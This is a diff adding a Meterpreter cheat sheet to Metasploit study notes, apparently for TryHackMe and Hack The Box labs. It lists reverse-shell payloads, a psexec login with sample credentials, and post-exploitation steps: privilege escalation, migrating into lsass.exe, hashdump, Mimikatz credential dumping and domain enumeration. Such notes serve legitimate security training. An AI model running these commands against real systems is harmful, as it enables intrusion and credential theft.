@@ -843,3 +843,543 @@ Displays the target system's hostname.
 | End all sessions      | `sessions -K`         |
 
 **Key takeaway:** Think of Metasploit as a workflow rather than a collection of individual commands. In most engagements, you'll repeatedly follow the same pattern: **search → use → show options → set → run/exploit → interact with sessions**. Once that workflow becomes familiar, learning new modules is much easier.
+
+These notes are focused on **Meterpreter**—what it is, how to choose the right payload, and the most common post-exploitation workflows. Here's a condensed CTF-focused cheat sheet.
+
+---
+
+# 1. Meterpreter Variants
+
+Choose the payload based on **OS + Runtime + Connection Method**.
+
+| Target             | Payload                                      |
+| ------------------ | -------------------------------------------- |
+| Windows            | `windows/x64/meterpreter/reverse_tcp`        |
+| Linux              | `linux/x64/meterpreter/reverse_tcp` (Mettle) |
+| PHP website        | `php/meterpreter/reverse_tcp`                |
+| Java application   | `java/meterpreter/reverse_https`             |
+| Python application | `python/meterpreter/reverse_tcp`             |
+
+---
+
+## Connection Types
+
+### Reverse TCP (most common)
+
+Victim connects back.
+
+```
+windows/x64/meterpreter/reverse_tcp
+```
+
+---
+
+### Reverse HTTPS
+
+Looks like HTTPS traffic.
+
+Useful if outbound web traffic is allowed.
+
+```
+windows/x64/meterpreter/reverse_https
+```
+
+---
+
+### Bind TCP
+
+Victim listens.
+
+You connect to them.
+
+```
+windows/x64/meterpreter/bind_tcp
+```
+
+---
+
+# 2. Staged vs Stageless
+
+### Staged
+
+```
+meterpreter/reverse_tcp
+```
+
+Uses `/`
+
+Downloads Meterpreter after connecting.
+
+---
+
+### Stageless
+
+```
+meterpreter_reverse_tcp
+```
+
+Uses `_`
+
+Entire payload is included.
+
+---
+
+# 3. Finding Payloads
+
+```
+search type:payload meterpreter
+```
+
+---
+
+# 4. Getting Initial Access (Psexec)
+
+```
+use exploit/windows/smb/psexec
+
+set RHOSTS <ip>
+set SMBUser ballen
+set SMBPass Password1
+set LHOST <your_ip>
+
+exploit
+```
+
+If it fails...
+
+Run it again.
+
+---
+
+# 5. Essential Meterpreter Commands
+
+## System Information
+
+```
+sysinfo
+```
+
+Shows
+
+* hostname
+* OS
+* architecture
+* domain
+
+---
+
+```
+getuid
+```
+
+Current user.
+
+Example
+
+```
+NT AUTHORITY\SYSTEM
+```
+
+---
+
+```
+getpid
+```
+
+Current process.
+
+---
+
+```
+ps
+```
+
+List running processes.
+
+Very important for migration.
+
+---
+
+```
+idletime
+```
+
+Shows whether user is active.
+
+---
+
+# 6. File System
+
+Current directory
+
+```
+pwd
+```
+
+---
+
+Change directory
+
+```
+cd C:\Users
+```
+
+---
+
+List files
+
+```
+ls
+```
+
+---
+
+Read a file
+
+```
+cat notes.txt
+```
+
+---
+
+Search
+
+Entire drive
+
+```
+search -f flag.txt
+```
+
+Specific folder
+
+```
+search -f *.txt -d C:\Users
+```
+
+---
+
+Download
+
+```
+download C:\Users\ballen\Desktop\flag.txt
+```
+
+---
+
+Upload
+
+```
+upload winpeas.exe C:\Temp\
+```
+
+---
+
+# 7. Networking
+
+Interfaces
+
+```
+ifconfig
+```
+
+---
+
+Connections
+
+```
+netstat
+```
+
+Useful for pivoting.
+
+---
+
+# 8. Native Windows Shell
+
+Drop into CMD
+
+```
+shell
+```
+
+Return
+
+```
+exit
+```
+
+---
+
+Run one command
+
+```
+execute -f ipconfig -i
+```
+
+---
+
+# 9. Process Migration
+
+Very common.
+
+Find process
+
+```
+ps
+```
+
+Move into it
+
+```
+migrate <PID>
+```
+
+Example
+
+```
+migrate 716
+```
+
+Verify
+
+```
+getpid
+```
+
+---
+
+Good migration targets
+
+* explorer.exe
+* svchost.exe
+* lsass.exe (for credentials)
+
+---
+
+# 10. Privilege Escalation
+
+Try
+
+```
+getsystem
+```
+
+Verify
+
+```
+getuid
+```
+
+---
+
+# 11. Dump Password Hashes
+
+Requires SYSTEM.
+
+```
+hashdump
+```
+
+Output
+
+```
+Administrator
+Guest
+ballen
+```
+
+---
+
+# 12. Kiwi (Mimikatz)
+
+Load
+
+```
+load kiwi
+```
+
+Dump credentials
+
+```
+creds_all
+```
+
+Can reveal
+
+* NTLM hashes
+* plaintext passwords
+* Kerberos tickets
+
+---
+
+# 13. Python Extension
+
+Load
+
+```
+load python
+```
+
+Run Python
+
+```
+python_execute "print('Hello')"
+```
+
+---
+
+# 14. Background Session
+
+```
+background
+```
+
+---
+
+Show sessions
+
+```
+sessions
+```
+
+Interact
+
+```
+sessions -i 1
+```
+
+Kill
+
+```
+sessions -K
+```
+
+---
+
+# 15. Post Modules
+
+General workflow
+
+```
+background
+
+use post/...
+
+set SESSION 1
+
+run
+```
+
+---
+
+Example
+
+Enumerate domain
+
+```
+use post/windows/gather/enum_domain
+
+set SESSION 1
+
+run
+```
+
+---
+
+Other useful modules
+
+Shares
+
+```
+post/windows/gather/enum_shares
+```
+
+Installed software
+
+```
+post/windows/gather/enum_applications
+```
+
+Environment variables
+
+```
+post/multi/gather/env
+```
+
+Upgrade shell
+
+```
+post/multi/manage/shell_to_meterpreter
+```
+
+---
+
+Search post modules
+
+```
+search type:post
+```
+
+---
+
+# Typical CTF Workflow
+
+1. Gain shell
+
+```
+exploit
+```
+
+2. Check system
+
+```
+sysinfo
+getuid
+```
+
+3. Find interesting processes
+
+```
+ps
+```
+
+4. Migrate (if needed)
+
+```
+migrate <PID>
+```
+
+5. Become SYSTEM
+
+```
+getsystem
+```
+
+6. Dump hashes
+
+```
+hashdump
+```
+
+7. Load Kiwi
+
+```
+load kiwi
+creds_all
+```
+
+8. Search for flags
+
+```
+search -f flag.txt
+```
+
+9. Read flag
+
+```
+cat C:\Users\Administrator\Desktop\flag.txt
+```
+
+10. Background the session and run post-exploitation modules as needed.
+
+This sequence covers the majority of Windows-focused TryHackMe and Hack The Box Meterpreter exercises.
